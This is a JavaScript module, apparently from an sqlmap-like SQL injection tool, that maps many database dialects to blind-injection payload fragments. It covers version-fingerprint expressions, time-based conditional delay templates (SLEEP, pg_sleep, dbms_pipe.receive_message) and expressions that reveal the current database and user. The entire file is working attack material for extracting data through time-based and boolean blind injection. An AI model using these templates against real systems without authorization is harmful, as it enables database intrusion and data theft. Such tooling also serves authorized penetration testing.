// =====================================================================
// scalarExprs.js — 各库裸标量表达式（版本 / 时间延迟 / 当前库 / 当前用户）
// 自 extractionMaps.js 拆出（纯搬移）。
// =====================================================================
// 各库版本表达式（盲注提取证明用）
export const VERSION_EXPR = {
  MySQL: 'version()',
  PostgreSQL: 'version()',
  SQLite: 'sqlite_version()',
  'SQL Server': '@@version',
  Oracle: "(SELECT banner FROM v$version WHERE rownum=1)",
  // C/D 方向：无原生 version() 的库用常量串/版本视图回显标识（与 DB_VERSION 对齐）
  MariaDB: 'version()',
  TiDB: 'version()',
  DM8: "(SELECT banner FROM v$version WHERE rownum=1)",
  ClickHouse: 'version()',
  DB2: "'DB2'",
  Access: "'ACCESS'",
  HSQLDB: "'HSQLDB'",
  Derby: "'DERBY'",
  MonetDB: '(SELECT sys_version FROM sys.version)',
  // [⑭] 补全 4 库版本表达式
  Sybase: '@@version',
  Firebird: "(SELECT rdb$get_context('SYSTEM', 'ENGINE_VERSION') FROM rdb$database)",
  Informix: "DBINFO('version', 'full')",
  H2: 'H2VERSION()',
};

// 时间盲注条件延迟表达式（condition 为真时触发 sleep，耗时高即判定为真）。
// 仅覆盖「有标量条件延迟原语」的基础方言；SQL Server 的 WAITFOR DELAY 是语句而非函数，
// 无法在 SELECT 表达式中使用（需堆叠），SQLite 无原生 sleep 函数，故两者返回 null ->
// 调用方降级布尔通道（诚实边界，与 sqlmap 对无延迟原语库的降级策略一致）。
// P2-P5：延迟秒数由调用方传入（config.timeBlindSleepSec，默认 2），替代硬编码 3s。
export const TIME_COND = {
  /** @type {(c: string, sec: number) => string} */
  MySQL: (c, sec = 2) => `IF((${c}), SLEEP(${sec}), 0)`,
  /** @type {(c: string, sec: number) => string} */
  PostgreSQL: (c, sec = 2) => `(CASE WHEN (${c}) THEN pg_sleep(${sec}) ELSE 0 END)`,
  /** @type {(c: string, sec: number) => string} */
  Oracle: (c, sec = 2) => `(CASE WHEN (${c}) THEN dbms_pipe.receive_message('sqli',${sec}) ELSE 0 END)`,
  // [⑯] ClickHouse：sleep() 函数 + if() 三元表达式（CH 函数名小写）
  /** @type {(c: string, sec: number) => string} */
  ClickHouse: (c, sec = 2) => `if((${c}), sleep(${sec}), 0)`,
  // [P1] H2：内建 SLEEP(ms)（{SLEEP}000 秒->毫秒），返回 0；CASE WHEN 条件延迟
  /** @type {(c: string, sec: number) => string} */
  H2: (c, sec = 2) => `(CASE WHEN (${c}) THEN SLEEP(${sec}000) ELSE 0 END)`,
  // [P1] MonetDB：内建 sys.sleep(sec)（单位秒），返回 NULL/整数值因版本而异
  /** @type {(c: string, sec: number) => string} */
  MonetDB: (c, sec = 2) => `(CASE WHEN (${c}) THEN sys.sleep(${sec}) ELSE 0 END)`,
  // Sybase/SQL Server 的 WAITFOR DELAY 是语句级，不能在 SELECT 表达式中使用 -> null（降级布尔通道）
  // Sybase 时间盲注检测走 PAYLOADS.Sybase.time 堆叠模板，数据提取降级布尔
  // [P1] 以下 6 库无可靠标量延时原语 -> null（诚实降级布尔通道）：
  // DB2：无内建 sleep/delay 函数（递归 CTE 等替代不可靠且版本依赖）
  DB2: null,
  // Firebird：无内建 sleep（PSQL 块循环需 EXECUTE PROCEDURE，非标量表达式）
  Firebird: null,
  // Informix：无内建 sleep（SYSTEM 需 OS 级调用，非标量表达式）
  Informix: null,
  // Access：Jet SQL 无任何延时原语
  Access: null,
  // HSQLDB：无内建 sleep（Java 存储过程需 ALIAS 注册，非标量表达式）
  HSQLDB: null,
  // Derby：无内建 sleep（Java 存储过程需 PROCEDURE，非标量表达式）
  Derby: null,
};

// 当前库名查询表达式（对标 sqlmap --current-db）：各方言裸标量表达式，extractScalar
// 通过 fromDummy 自动补 FROM dual / SYSIBM.SYSDUMMY1，故此表仅存裸表达式。
// SQLite 无会话库概念 -> null（currentDb 返回 null，诚实降级，与 sqlmap 边界一致）。
export const CURRENT_DB_EXPR = {
  MySQL: 'database()',
  MariaDB: 'database()',
  TiDB: 'database()',
  PostgreSQL: 'current_database()',
  SQLite: null,
  'SQL Server': 'DB_NAME()',
  Oracle: "SYS_CONTEXT('USERENV','DB_NAME')",
  DM8: "SYS_CONTEXT('USERENV','DB_NAME')",
  ClickHouse: 'currentDatabase()',
  DB2: 'CURRENT_SERVER',
  HSQLDB: 'CURRENT_CATALOG',
  Derby: 'CURRENT SCHEMA',
  Access: null,
  MonetDB: 'current_database()',
  // [⑭] 补全 4 库当前库名表达式
  Sybase: 'db_name()',
  Firebird: null, // 单库架构，无会话库概念
  Informix: "DBINFO('dbname')",
  H2: 'CURRENT_CATALOG',
};

// 当前用户查询表达式（对标 sqlmap --current-user）：SQLite 无会话用户概念 -> 模拟常量。
export const CURRENT_USER_EXPR = {
  MySQL: 'current_user()',
  MariaDB: 'current_user()',
  TiDB: 'current_user()',
  PostgreSQL: 'current_user',
  SQLite: "'sqlite_user'",
  'SQL Server': 'SUSER_SNAME()',
  Oracle: 'USER',
  DM8: 'USER',
  ClickHouse: 'currentUser()',
  DB2: 'SESSION_USER',
  HSQLDB: 'CURRENT_USER',
  Derby: 'CURRENT_USER',
  Access: "'access_user'",
  MonetDB: 'current_user',
  // [⑭] 补全 4 库当前用户表达式
  Sybase: 'user_name()',
  Firebird: 'CURRENT_USER',
  Informix: 'USER',
  H2: 'CURRENT_USER',
};

